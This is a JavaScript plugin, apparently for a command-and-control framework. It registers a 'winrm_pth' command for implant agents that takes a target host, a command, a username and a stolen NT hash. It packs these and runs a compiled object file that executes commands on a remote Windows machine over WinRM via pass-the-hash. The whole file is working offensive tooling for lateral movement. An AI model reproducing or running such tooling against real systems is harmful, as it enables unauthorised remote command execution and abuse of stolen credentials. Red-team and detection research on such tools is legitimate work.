var metadata = {
    name: "WinRM-PTH",
    description: "WinRM command execution with native NTLMv2 pass-the-hash authentication"
};

var cmd_winrm_pth = ax.create_command(
    "winrm_pth",
    "Execute a command through WinRM using NTLMv2 pass-the-hash",
    "winrm_pth 192.0.2.10 \"whoami /all\" LAB\\Administrator <NT_HASH> -t 15000"
);
cmd_winrm_pth.addArgString("target", true, "Target hostname or IP address");
cmd_winrm_pth.addArgString("cmd", true, "Command to execute through cmd.exe /c");
cmd_winrm_pth.addArgString("credentials", true, "DOMAIN\\username or username");
cmd_winrm_pth.addArgString("hash", true, "NT hash (32 hexadecimal characters)");
cmd_winrm_pth.addArgFlagInt("-t", "timeout", false, "Timeout in milliseconds (default: 15000)");
cmd_winrm_pth.addArgFlagInt("-P", "port", false, "WinRM HTTP port (default: 5985)");

cmd_winrm_pth.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let target = String(parsed_json["target"] || "").trim();
    let command = String(parsed_json["cmd"] || "");
    let credentials = String(parsed_json["credentials"] || "");
    let hash = String(parsed_json["hash"] || "");
    let timeout = parsed_json["timeout"];
    let port = parsed_json["port"];
    if (timeout === undefined || timeout === null) timeout = 15000;
    if (port === undefined || port === null) port = 5985;

    if (!target || target.length > 255 || !/^[A-Za-z0-9_.:-]+$/.test(target))
        throw new Error("Target must be a hostname or IP address without a URL scheme or path");
    if (!command || command.length > 1900)
        throw new Error("Command must contain 1-1900 characters");
    if (!/^[0-9a-fA-F]{32}$/.test(hash))
        throw new Error("NT hash must be exactly 32 hexadecimal characters");
    if (!Number.isInteger(timeout) || timeout < 1000 || timeout > 600000)
        throw new Error("Timeout must be between 1000 and 600000 milliseconds");
    if (!Number.isInteger(port) || port < 1 || port > 65535)
        throw new Error("Port must be between 1 and 65535");

    let domain = "";
    let username = credentials;
    let separator = credentials.indexOf("\\");
    if (separator >= 0) {
        if (separator === 0 || separator === credentials.length - 1 ||
            credentials.indexOf("\\", separator + 1) >= 0)
            throw new Error("Credentials must contain exactly one backslash: DOMAIN\\username");
        domain = credentials.substring(0, separator);
        username = credentials.substring(separator + 1);
    }
    if (!username)
        throw new Error("Credentials must be DOMAIN\\username or username");

    let parameters = ax.bof_pack(
        "wstr,wstr,wstr,wstr,wstr,int,int",
        [target, command, username, hash, domain, timeout, port]
    );
    let object_path = ax.script_dir() + "bin/winrm_pth." + ax.arch(id) + ".o";
    let identity = domain ? domain + "\\" + username : username;
    let message = `Task: WinRM PTH to ${target} as ${identity}`;

    ax.execute_alias(id, cmdline, `execute bof "${object_path}" ${parameters}`, message);
});

var winrm_pth_group = ax.create_commands_group("WinRM-PTH", [cmd_winrm_pth]);
ax.register_commands_group(winrm_pth_group, ["beacon", "gopher", "kharon"], ["windows"], []);
